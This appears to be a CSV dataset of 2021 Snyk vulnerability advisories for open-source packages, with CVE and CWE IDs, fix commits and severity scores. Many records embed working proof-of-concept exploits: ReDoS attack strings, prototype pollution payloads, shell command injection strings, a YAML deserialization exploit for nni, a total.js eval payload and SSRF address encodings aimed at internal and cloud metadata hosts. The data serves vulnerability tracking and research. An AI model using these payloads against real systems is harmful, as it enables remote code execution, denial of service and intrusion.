CVE-2021-23386,CWE-201,Snyk,https://security.snyk.io/vuln/SNYK-JS-DNSPACKET-1293563,20/05/2021,18/05/2021,https://github.com/mafintosh/dns-packet/commit/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56,Remote Memory Exposure,https://api.github.com/repos/mafintosh/dns-packet/commits/25f15dd0fedc53688b25fd053ebbdffe3d5c1c56,Mathias Buus,mathiasbuus@gmail.com,dns-packet,25f15dd0fedc53688b25fd053ebbdffe3d5c1c56,do trim on encodingLength as well,JavaScript,7.7,high,"dns-packet is an An abstract-encoding compliant module for encoding / decoding DNS packets
Affected versions of this package are vulnerable to Remote Memory Exposure. It creates buffers with allocUnsafe and does not always fill them before forming network packets. This can expose internal application memory over unencrypted network when querying crafted invalid domain names.",2021
CVE-2021-23392,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-1090597,06/06/2021,05/04/2021,https://github.com/locutusjs/locutus/commit/eb863321990e7e5514aa14f68b8d9978ece9e65e,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/locutusjs/locutus/commits/eb863321990e7e5514aa14f68b8d9978ece9e65e,Rafał Kukawski,rafal@kukawski.pl,locutus,eb863321990e7e5514aa14f68b8d9978ece9e65e,Prevent ReDos issue with regex inside gopher_parsedir (#446),JavaScript,5.3,medium,"locutus is a Locutus other languages' stadard libraries to JavaScript for fun and educational purposes
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the gopher_parsedir function.
PoC by Yeting Li
var gopher_parsedir = require(""locutus/php/net-gopher/gopher_parsedir"")
function build_attack(n) {
 var ret = """"
 for (var i = 0; i < n; i++) {
  ret += ""\t""
 }
 return ret + ""!"";
}


var attack_str = build_attack(5000)
// var entry = gopher_parsedir('0All about my gopher site.\t/allabout.txt\tgopher.example.com\t70\u000d\u000a')
var entry = gopher_parsedir(attack_str)",2021
CVE-2021-23387,CWE-601,Snyk,https://security.snyk.io/vuln/SNYK-JS-TRAILINGSLASH-1085707,17/05/2021,15/03/2021,https://github.com/fardog/trailing-slash/commit/f8e66f1429308247e5a119d430203077d8f05048,Open Redirect,https://api.github.com/repos/fardog/trailing-slash/commits/f8e66f1429308247e5a119d430203077d8f05048,Nathan Wittstock,nate@fardog.io,trailing-slash,f8e66f1429308247e5a119d430203077d8f05048,"fix open redirect (#3)

* fix open redirect

* update node versions",Config files,5.4,medium,"trailing-slash is an Add or remove trailing slashes, and redirect.
Affected versions of this package are vulnerable to Open Redirect via the use of trailing double slashes in the URL when accessing the vulnerable endpoint (such as https://example.com//attacker.example/). The vulnerable code is in index.js::createTrailing(), as the web server uses relative URLs instead of absolute URLs.
PoC
1. Set up an server endpoint that uses trailing-slashes
2. Append ""//example.com"" to the endpoint - it should redirect to example.com",2021
CVE-2021-23365,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMTYKTECHNOLOGIESTYKIDENTITYBROKER-1089720,22/04/2021,30/03/2021,https://github.com/TykTechnologies/tyk-identity-broker/commit/243092965b0f93a95a14cb882b5b9a3df61dd5c0,Authentication Bypass,https://api.github.com/repos/TykTechnologies/tyk-identity-broker/commits/243092965b0f93a95a14cb882b5b9a3df61dd5c0,James Lucktaylor,jlucktay+github@gmail.com,tyk-identity-broker,243092965b0f93a95a14cb882b5b9a3df61dd5c0,Merge branch 'master' into fix/saml-vuln-and-broken-tests,Unknown,4.8,medium,Affected versions of this package are vulnerable to Authentication Bypass via the Go XML parser which can cause SAML authentication bypass. This is because the XML parser doesn’t guarantee integrity in the XML round-trip (encoding/decoding XML data).,2021
CVE-2021-23382,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-POSTCSS-1255640,26/04/2021,26/04/2021,https://github.com/postcss/postcss/commit/2b1d04c867995e55124e0a165b7c6622c1735956,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/postcss/postcss/commits/2b1d04c867995e55124e0a165b7c6622c1735956,Andrey Sitnik,andrey@sitnik.ru,postcss,2b1d04c867995e55124e0a165b7c6622c1735956,"Merge pull request #1567 from yetingli/main

Fix ReDoS in previous-map",JavaScript,5.3,medium,"postcss is a PostCSS is a tool for transforming styles with JS plugins.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \/\*\s*# sourceMappingURL=(.*).
PoC
var postcss = require(""postcss"")
function build_attack(n) {
    var ret = ""a{}""
    for (var i = 0; i < n; i++) {
        ret += ""/*# sourceMappingURL=""
    }
    return ret + ""!"";
}

// postcss.parse('a{}/*# sourceMappingURL=a.css.map */')
for(var i = 1; i <= 500000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
        try{
            postcss.parse(attack_str)
            var time_cost = Date.now() - time;
            console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"");
            }
        catch(e){
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"");
        }
    }
}",2021
CVE-2021-29060,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-COLORSTRING-1082939,12/03/2021,05/03/2021,https://github.com/Qix-/color-string/commit/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/Qix-/color-string/commits/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3,Josh Junon,junon@wavetilt.com,color-string,0789e21284c33d89ebc4ab4ca6f759b9375ac9d3,"fix ReDos in hwb() parser (low-severity)

Discovered by Yeting Li, c/o Colin Ife via Snyk.io.

A ReDos (Regular Expression Denial of Service) vulnerability
was responsibly disclosed to me via email by Colin on
Mar 5 2021 regarding an exponential time complexity for
linearly increasing input lengths for `hwb()` color strings.

Strings reaching more than 5000 characters would see several
milliseconds of processing time; strings reaching more than
50,000 characters began seeing 1500ms (1.5s) of processing time.

The cause was due to a the regular expression that parses
hwb() strings - specifically, the hue value - where
the integer portion of the hue value used a 0-or-more quantifier
shortly thereafter followed by a 1-or-more quantifier.

This caused excessive backtracking and a cartesian scan,
resulting in exponential time complexity given a linear
increase in input length.

Thank you Yeting Li and Colin Ife for bringing this to my
attention in a secure, responsible and professional manner.

A CVE will not be assigned for this vulnerability.",JavaScript,5.3,medium,"color-string is a Parser and generator for CSS color strings
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the hwb regular expression in the cs.get.hwb function in index.js. The affected regular expression exhibits quadratic worst-case time complexity.",2021
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632,11/03/2021,01/03/2021,https://github.com/amzn/style-dictionary/commit/89ee39a7953c1825ea4578d43f129e23b4ed5da8,Prototype Pollution,https://api.github.com/repos/amzn/style-dictionary/commits/89ee39a7953c1825ea4578d43f129e23b4ed5da8,Danny Banks,djb@amazon.com,style-dictionary,89ee39a7953c1825ea4578d43f129e23b4ed5da8,fix(extend): remove prototype pollution (#560),JavaScript,7.5,high,"style-dictionary is a Style once, use everywhere. A build system for creating cross-platform styles.
Affected versions of this package are vulnerable to Prototype Pollution.
PoC
const StyleDictionary = require('style-dictionary');
const obj = {};
let opts = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
console.log(""Before : "" + obj.polluted);
StyleDictionary.extend(opts);
console.log(""After : "" + obj.polluted);",2021
CVE-2021-23363,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-KILLBYPORT-1078531,30/03/2021,23/02/2021,https://github.com/GuyMograbi/kill-by-port/commit/ea5b1f377e196a4492e05ff070eba8b30b7372c4,Arbitrary Command Injection,https://api.github.com/repos/GuyMograbi/kill-by-port/commits/ea5b1f377e196a4492e05ff070eba8b30b7372c4,Guy Mograbi,guy.mograbi@gmail.com,kill-by-port,ea5b1f377e196a4492e05ff070eba8b30b7372c4,fix kill by port,JavaScript,6.3,medium,"kill-by-port is a kills process by port
Affected versions of this package are vulnerable to Arbitrary Command Injection. If (attacker-controlled) user input is given to the killByPort  function, it is possible for an attacker to execute arbitrary commands.
This is due to use of the child_process exec function without input sanitization.
PoC (provided by reporter):
var kill_by_port = require('kill-by-port');

kill_by_port.killByPort('$(touch success)');

A file called success will be created as a result of the execution of touch success.",2021
CVE-2021-21366,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-JS-XMLDOM-1084960,10/03/2021,10/03/2021,https://github.com/xmldom/xmldom/commit/d4201b9dfbf760049f457f9f08a3888d48835135,XML External Entity (XXE) Injection,https://api.github.com/repos/xmldom/xmldom/commits/d4201b9dfbf760049f457f9f08a3888d48835135,Chris Brody,chris.brody+brodybits@gmail.com,xmldom,d4201b9dfbf760049f457f9f08a3888d48835135,"Merge pull request from GHSA-h6q6-9hqw-rwfv

* fix!: Preserve quotes in DOCTYPE declaration

Since the only purpose of parsing the DOCTYPE is to be able to restore it when serializing,
we decided that it would be best to leave the parsed publicId and systemId as is,
including any quotes.

BREAKING CHANGE: If somebody relies on the actual unquoted values of those ids,
they will need to take care of either single or double quotes and the right escaping.

(Without this change this would not have been possible because the SAX parser already
dropped the information about the quotes that have been used in the source.)

https://www.w3.org/TR/2006/REC-xml11-20060816/#dtd
https://www.w3.org/TR/2006/REC-xml11-20060816/#IDAX1KS (External Entity Declaration)

Co-authored-by: Christian Bewernitz <coder@karfau.de>
Co-authored-by: Chris Brody <chris.brody+brodybits@gmail.com>

* feat(security): Improve error reporting; throw on duplicate attribute

BREAKING CHANGE: It is currently not clear how to consistently deal with duplicate attributes,
so it is also safer for our users to fail when detecting them.

It is possible to configure the `DOMParser.errorHandler` before parsing, to handle those errors differently.

To accomplish this and also be able to verify it in tests we needed to:

- create a new `Error` type `ParseError` and export it
- Throw `ParseError` from `errorHandler.fatalError` and prevent those from being caught in `XMLReader`.
- export `DOMHandler` constructor as `__DOMHandler`

Co-authored-by: Christian Bewernitz <coder@karfau.de>
Co-authored-by: Chris Brody <chris.brody+brodybits@gmail.com>

Co-authored-by: Christian Bewernitz <coder@karfau.de>",JavaScript,5.4,medium,"xmldom is an A pure JavaScript W3C standard-based (XML DOM Level 2 Core) DOMParser and XMLSerializer module.
Affected versions of this package are vulnerable to XML External Entity (XXE) Injection. Does not correctly preserve system identifiers, FPIs or namespaces when repeatedly parsing and serializing maliciously crafted documents.",2021
CVE-2021-23358,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-UNDERSCORE-1080984,29/03/2021,03/03/2021,https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66,Arbitrary Code Injection,https://api.github.com/repos/jashkenas/underscore/commits/4c73526d43838ad6ab43a6134728776632adeb66,Julian Gonggrijp,dev@juliangonggrijp.com,underscore,4c73526d43838ad6ab43a6134728776632adeb66,Fix #2911,JavaScript,5.5,medium,"underscore is a JavaScript's functional programming helper library.
Affected versions of this package are vulnerable to Arbitrary Code Injection via the template function, particularly when the variable option is taken from _.templateSettings as it is not sanitized.
PoC
const _ = require('underscore');
_.templateSettings.variable = ""a = this.process.mainModule.require('child_process').execSync('touch HELLO')"";
const t = _.template("""")();",2021
CVE-2021-23362,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-HOSTEDGITINFO-1088355,23/03/2021,28/11/2020,https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/npm/hosted-git-info/commits/bede0dc38e1785e732bf0a48ba6f81a4a908eba3,nlf,quitlahok@gmail.com,hosted-git-info,bede0dc38e1785e732bf0a48ba6f81a4a908eba3,"fix: simplify the regular expression for shortcut matching

PR-URL: https://github.com/npm/hosted-git-info/pull/76
Credit: @nlf
Close: #76
Reviewed-by: @isaacs",JavaScript,5.3,medium,"hosted-git-info is a Provides metadata and conversions from repository urls for Github, Bitbucket and Gitlab
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression shortcutMatch  in the fromUrl function in index.js. The affected regular expression exhibits polynomial worst-case time complexity.
PoC by Yeting Li
var hostedGitInfo = require(""hosted-git-info"")
function build_attack(n) {
    var ret = ""a:""
    for (var i = 0; i < n; i++) {
        ret += ""a""
    }
    return ret + ""!"";
}

for(var i = 1; i <= 5000000; i++) {
   if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
       var parsedInfo = hostedGitInfo.fromUrl(attack_str)
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"")
}",2021
,CWE-918,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPTERODACTYLWINGSROUTERDOWNLOADER-1083290,09/03/2021,12/02/2021,https://github.com/pterodactyl/wings/commit/00195b4a5b78a5e70b4129da2f5c0edec3cb2590,Server-side Request Forgery (SSRF),https://api.github.com/repos/pterodactyl/wings/commits/00195b4a5b78a5e70b4129da2f5c0edec3cb2590,Matthew Penner,me@matthewp.io,wings,00195b4a5b78a5e70b4129da2f5c0edec3cb2590,downloader: properly detect and handle integer IPs,Go,3.1,low,"github.com/pterodactyl/wings/router/downloader is a Wings is Pterodactyl's server control plane, built for the rapidly changing gaming industry and designed to be highly performant and secure.
Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF). It is possible for a malicious user to bypass the internalRanges blacklist check to scan or access resources on the local network by using decimal notation. The attack complexity of this vulnerability is high and exploitation is unlikely since Golang doesn't seem to support dialing IPs in decimal notation.
PoC
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254",2021
,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-NNI-1073630,10/03/2021,12/02/2021,https://github.com/microsoft/nni/commit/61ac844f5106b779515b94b5ba22bde2f1ec781e,Arbitrary Code Execution,https://api.github.com/repos/microsoft/nni/commits/61ac844f5106b779515b94b5ba22bde2f1ec781e,Anon-Artist,61599526+Anon-Artist@users.noreply.github.com,nni,61ac844f5106b779515b94b5ba22bde2f1ec781e,Update common_utils.py,Python,8.6,high,"nni is a Neural Network Intelligence package
Affected versions of this package are vulnerable to Arbitrary Code Execution. Arbitrary code execution is possible due to a use of a known vulnerable function load() within yaml parsing.
PoC
1. Create the following PoC file: exploit.py

import os
os.system('pip3 install nni')
exploit = """"""authorName: !!python/object/new:type
args: [""z"", !!python/tuple [], {""extend"": !!python/name:exec }]
listitems: ""import('os').system('xcalc')""
experimentName: example_mnist_pytorch
trialConcurrency: 1
maxExecDuration: 1h
maxTrialNum: 10
#choice: local, remote, pai
trainingServicePlatform: local
searchSpacePath: search_space.json
#choice: true, false
useAnnotation: false
tuner:
#choice: TPE, Random, Anneal, Evolution, BatchTuner, MetisTuner, GPTuner
#SMAC (SMAC should be installed through nnictl)
builtinTunerName: TPE
classArgs:
#choice: maximize, minimize
optimize_mode: maximize
trial:
command: python3 mnist.py
codeDir: .
gpuNum: 0
""""""
open('exploit.yml','w+').write(exploit)
os.system('nnictl create --config exploit.yml')

Execute the following commands in another terminal: python3 exploit.py
Check the Output: xcalc will pop up.",2021
CVE-2021-23360,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-KILLPORT-1078535,21/03/2021,23/02/2021,https://github.com/ssnau/killport/commit/bec8e371f170a12e11cd222ffc7a6e1ae9942638,Arbitrary Command Injection,https://api.github.com/repos/ssnau/killport/commits/bec8e371f170a12e11cd222ffc7a6e1ae9942638,ssnau,korige@gmail.com,killport,bec8e371f170a12e11cd222ffc7a6e1ae9942638,fix a vulnerability issue if a provided port is not a number,JavaScript,7.5,high,"killport is an a nodejs module to kill any processes base on its port
Affected versions of this package are vulnerable to Arbitrary Command Injection. If (attacker-controlled) user input is given, it is possible for an attacker to execute arbitrary commands.
This is due to use of the child_process exec function without input sanitization.
Running this PoC will cause the command touch success to be executed, leading to the creation of a file called success.
PoC (provided by reporter):
var killport = require('killport');
killport(""$(touch success); #"");",2021
CVE-2021-23368,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-POSTCSS-1090595,12/04/2021,05/04/2021,https://github.com/postcss/postcss/commit/b6f3e4d5a8d7504d553267f80384373af3a3dec5,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/postcss/postcss/commits/b6f3e4d5a8d7504d553267f80384373af3a3dec5,Andrey Sitnik,andrey@sitnik.ru,postcss,b6f3e4d5a8d7504d553267f80384373af3a3dec5,Fix unsafe regexp in getAnnotationURL() too,JavaScript,5.3,medium,"postcss is a PostCSS is a tool for transforming styles with JS plugins.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.
PoC
var postcss = require(""postcss"")
function build_attack(n) {
    var ret = ""a{}/*# sourceMappingURL=""
    for (var i = 0; i < n; i++) {
        ret += "" ""
    }
    return ret + ""!"";
}

// postcss.parse('a{}/*# sourceMappingURL=a.css.map */')
for(var i = 1; i <= 500000; i++) {
    if (i % 10000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
        try{
            postcss.parse(attack_str)
            var time_cost = Date.now() - time;
            console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"");
            }
        catch(e){
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"");
        }
    }
}",2021
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SHVL-1085284,12/04/2021,12/03/2021,https://github.com/robinvdvleuten/shvl/commit/4ed0edfa70f7778556f7b7e9ef1ee5d6d002fce2,Prototype Pollution,https://api.github.com/repos/robinvdvleuten/shvl/commits/4ed0edfa70f7778556f7b7e9ef1ee5d6d002fce2,Robin van der Vleuten,robin@webstronauts.co,shvl,4ed0edfa70f7778556f7b7e9ef1ee5d6d002fce2,Fix assignment to constructor and prototype. Closes #35.,JavaScript,7.3,high,"shvl is a Get and set dot-notated properties within an object
Affected versions of this package are vulnerable to Prototype Pollution due to an incomplete fix not protecting against the constructor.prototype vector.
POC
var shvl = require(""shvl"")
let obj = {}
console.log(""Before: "" + {}.polluted)
shvl.set(obj, 'constructor.prototype.polluted', 'Polluted')
console.log(""After: "" + {}.polluted)",2021
CVE-2021-23353,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSPDF-1073626,09/03/2021,12/02/2021,https://github.com/MrRio/jsPDF/commit/d8bb3b39efcd129994f7a3b01b632164144ec43e,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/MrRio/jsPDF/commits/d8bb3b39efcd129994f7a3b01b632164144ec43e,Yeting Li,liyt@ios.ac.cn,jsPDF,d8bb3b39efcd129994f7a3b01b632164144ec43e,fix ReDoS-vulnerable regexp in addImage (#3091),JavaScript,5.9,medium,"jspdf is a PDF Document creation from JavaScript
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). ReDoS is possible via the addImage function.",2021
CVE-2021-23371,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-CHRONONODE-1083228,11/04/2021,08/03/2021,https://github.com/wanasit/chrono/commit/98815b57622443b5c498a427210ebd603d705f4c,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/wanasit/chrono/commits/98815b57622443b5c498a427210ebd603d705f4c,Wanasit Tanakitrungruang,wanasit.wt@gmail.com,chrono,98815b57622443b5c498a427210ebd603d705f4c,Fix: unblounded regex backtracking in timeunit parsing,TypeScript,7.5,high,"chrono-node is an A natural language date parser in Javascript
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It hangs on a date-like string with lots of embedded spaces.",2021
CVE-2021-23348,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-PORTPROCESSES-1078536,31/03/2021,23/02/2021,https://github.com/rrainn/PortProcesses/commit/86811216c9b97b01b5722f879f8c88a7aa4214e1,Arbitrary Command Injection,https://api.github.com/repos/rrainn/PortProcesses/commits/86811216c9b97b01b5722f879f8c88a7aa4214e1,Charlie Fish,fishcharlie@me.com,PortProcesses,86811216c9b97b01b5722f879f8c88a7aa4214e1,"Merge pull request from GHSA-vm67-7vmg-66vm

Adding check to ensure function arguments are numbers",JavaScript,6.3,medium,"portprocesses is a This tool letes you list and kill processes on a specified port.
Affected versions of this package are vulnerable to Arbitrary Command Injection. If (attacker-controlled) user input is given to the killProcess function, it is possible for an attacker to execute arbitrary commands.
This is due to use of the child_process exec function without input sanitization.",2021
CVE-2021-23370,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SWIPER-1088062,11/04/2021,22/03/2021,https://github.com/nolimits4web/swiper/commit/9dad2739b7474f383474773d5ab898a0c29ac178,Prototype Pollution,https://api.github.com/repos/nolimits4web/swiper/commits/9dad2739b7474f383474773d5ab898a0c29ac178,Vladimir Kharlampidi,nolimits4web@gmail.com,swiper,9dad2739b7474f383474773d5ab898a0c29ac178,fix(core): fixed __proto__ pollution,JavaScript,7.5,high,"swiper is a Most modern mobile touch slider and framework with hardware accelerated transitions
Affected versions of this package are vulnerable to Prototype Pollution.
PoC
var swiper = require('swiper');

var malicious_payload = '{""proto"":{""polluted"":""HACKED""}}';
console.log(""Before: "" + {}.polluted); // undefined
swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log(""After: "" + {}.polluted); // HACKED",2021
CVE-2021-23352,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JS-MADGE-1082875,09/03/2021,05/03/2021,https://github.com/pahen/madge/commit/da5cbc9ab30372d687fa7c324b22af7ffa5c6332,Command Injection,https://api.github.com/repos/pahen/madge/commits/da5cbc9ab30372d687fa7c324b22af7ffa5c6332,Patrik Henningsson,patrik.henningsson@gmail.com,madge,da5cbc9ab30372d687fa7c324b22af7ffa5c6332,Fix potential command injection vulnerability,JavaScript,8.6,high,"madge is a Madge is a developer tool for generating a visual graph of your module dependencies, finding circular dependencies, and give you other useful info.
Affected versions of this package are vulnerable to Command Injection. It is possible to specify a custom Graphviz path via the graphVizPath option parameter which when the .image(), .svg() or .dot() functions are called, is executed by the childprocess.exec function.
PoC
1. install `madge` module: `npm i madge`
2. run the following poc.js:

// Example taken from: https://github.com/pahen/madge#svg
const madge = require('madge');
madge('..', {graphVizPath: ""touch HELLO;""})
.then((res) => res.svg())
.then((writtenImagePath) => {
console.log('Image written to ' + writtenImagePath);
});",2021
CVE-2021-23351,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPIRESGOPROXYPROTO-1081577,07/03/2021,03/03/2021,https://github.com/pires/go-proxyproto/commit/7f48261db810703d173f27f3309a808cc2b49b8b,Denial of Service (DoS),https://api.github.com/repos/pires/go-proxyproto/commits/7f48261db810703d173f27f3309a808cc2b49b8b,Pires,1752631+pires@users.noreply.github.com,go-proxyproto,7f48261db810703d173f27f3309a808cc2b49b8b,"Merge pull request #71 from isedev/feature/issue-69-tests

Disallow header parsing beyond 107 bytes",Go,4.4,medium,"github.com/pires/go-proxyproto is a Go library implementation of the PROXY protocol, versions 1 and 2.
Affected versions of this package are vulnerable to Denial of Service (DoS) via the parseVersion1() function.
The reader in this package is a default bufio.Reader wrapping a net.Conn. It will read from the connection until it finds a newline.
Since no limits are implemented in the code, a deliberately malformed V1 header could be used to exhaust memory in a server process using this code - and create a DoS. This can be exploited by sending a stream starting with PROXY and continuing to send data (which does not contain a newline) until the target stops acknowledging.
The risk here is small, because only trusted sources should be allowed to send proxy protocol headers.",2021
CVE-2021-39207,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PARLAI-1078802,08/03/2021,24/02/2021,https://github.com/facebookresearch/ParlAI/commit/507d066ef432ea27d3e201da08009872a2f37725,Deserialization of Untrusted Data,https://api.github.com/repos/facebookresearch/ParlAI/commits/507d066ef432ea27d3e201da08009872a2f37725,huntr.dev | the place to protect open source,admin@418sec.com,ParlAI,507d066ef432ea27d3e201da08009872a2f37725,"RCE Fixed (#3402)

Co-authored-by: Anon-Artist <61599526+Anon-Artist@users.noreply.github.com>
Co-authored-by: Jamie Slome <jamie@418sec.com>",Python,7.3,high,"parlai is an Unified platform for dialogue research.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data caused by unsafe loading.",2021
CVE-2020-28502,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-XMLHTTPREQUESTSSL-1082936,05/03/2021,05/03/2021,https://github.com/driverdan/node-XMLHttpRequest/commit/983cfc244c7567ad6a59e366e55a8037e0497fe6,Arbitrary Code Injection,https://api.github.com/repos/driverdan/node-XMLHttpRequest/commits/983cfc244c7567ad6a59e366e55a8037e0497fe6,Kris Nye,krisnye@gmail.com,node-XMLHttpRequest,983cfc244c7567ad6a59e366e55a8037e0497fe6,fix for backslashes in data not encoding correctly,JavaScript,8.1,high,"xmlhttprequest-ssl is a fork of xmlhttprequest.
Affected versions of this package are vulnerable to Arbitrary Code Injection. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.
POC
const { XMLHttpRequest } = require(""xmlhttprequest"")

const xhr = new XMLHttpRequest()
xhr.open(""POST"", ""http://localhost.invalid/"", false /* use synchronize request */)
xhr.send(""\');require(&quot;fs&quot;).writeFileSync(&quot;/tmp/aaaaa.txt&quot;, &quot;poc-20210306&quot;);req.end();//"")",2021
CVE-2020-28502,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-XMLHTTPREQUEST-1082935,05/03/2021,05/03/2021,https://github.com/driverdan/node-XMLHttpRequest/commit/983cfc244c7567ad6a59e366e55a8037e0497fe6,Arbitrary Code Injection,https://api.github.com/repos/driverdan/node-XMLHttpRequest/commits/983cfc244c7567ad6a59e366e55a8037e0497fe6,Kris Nye,krisnye@gmail.com,node-XMLHttpRequest,983cfc244c7567ad6a59e366e55a8037e0497fe6,fix for backslashes in data not encoding correctly,JavaScript,8.1,high,"xmlhttprequest is a wrapper for the built-in http client to emulate the browser XMLHttpRequest object.
Affected versions of this package are vulnerable to Arbitrary Code Injection. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.
POC
const { XMLHttpRequest } = require(""xmlhttprequest"")

const xhr = new XMLHttpRequest()
xhr.open(""POST"", ""http://localhost.invalid/"", false /* use synchronize request */)
xhr.send(""\');require(&quot;fs&quot;).writeFileSync(&quot;/tmp/aaaaa.txt&quot;, &quot;poc-20210306&quot;);req.end();//"")",2021
CVE-2021-23344,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1077069,04/03/2021,19/02/2021,https://github.com/totaljs/framework/commit/c812bbcab8981797d3a1b9993fc42dad3d246f04,Remote Code Execution (RCE),https://api.github.com/repos/totaljs/framework/commits/c812bbcab8981797d3a1b9993fc42dad3d246f04,Peter Sirka,petersirka@gmail.com,framework,c812bbcab8981797d3a1b9993fc42dad3d246f04,Fixed potential vulnerability in `U.set()` method.,Unknown,9.8,critical,"total.js is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.
Affected versions of this package are vulnerable to Remote Code Execution (RCE) via set.
PoC
// To be run in a nodejs console:
require('total.js/utils').set({},'a;eval(`require(""child_process"")\\x2eexecSync(""touch pwned"")`);//')",2021
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824,01/03/2021,02/02/2021,https://github.com/ardalanamini/prototyped.js/commit/3ab56e78250d3d5b44ac03938d3d04591b206730,Prototype Pollution,https://api.github.com/repos/ardalanamini/prototyped.js/commits/3ab56e78250d3d5b44ac03938d3d04591b206730,Ardalan Amini,ardalanamini22@gmail.com,prototyped.js,3ab56e78250d3d5b44ac03938d3d04591b206730,fix: Prototype pollution vulnerability,TypeScript,7.5,high,"prototyped.js is a Common typescript ready prototypes available in both es5 and es6
Affected versions of this package are vulnerable to Prototype Pollution.
PoC
const set = require(""prototyped.js/dist/object/set"").default;
console.log(""Prototype before set"", ({}).isAdmin);
set({}, ""__proto__.isAdmin"", true);
console.log(""Prototype after set"", ({}).isAdmin);",2021
CVE-2021-23346,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY-1079306,01/03/2021,01/03/2021,https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/HenrikJoreteg/html-parse-stringify/commits/c7274a48e59c92b2b7e906fedf9065159e73fe12,Henrik Joreteg,hjoreteg@gmail.com,html-parse-stringify,c7274a48e59c92b2b7e906fedf9065159e73fe12,fixing reported ReDoS,Markdown,4.8,medium,"html-parse-stringify is a https://github.com/henrikjoreteg/html-parse-stringify
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). Sending certain input could cause one of the regular expressions that is used for parsing to backtrack, freezing the process.",2021
CVE-2021-23346,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY2-1079307,01/03/2021,01/03/2021,https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/HenrikJoreteg/html-parse-stringify/commits/c7274a48e59c92b2b7e906fedf9065159e73fe12,Henrik Joreteg,hjoreteg@gmail.com,html-parse-stringify,c7274a48e59c92b2b7e906fedf9065159e73fe12,fixing reported ReDoS,Markdown,4.8,medium,"html-parse-stringify2 is a This is a fork of html-parse-stringify
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). Sending certain input could cause one of the regular expressions that is used for parsing to backtrack, freezing the process.",2021
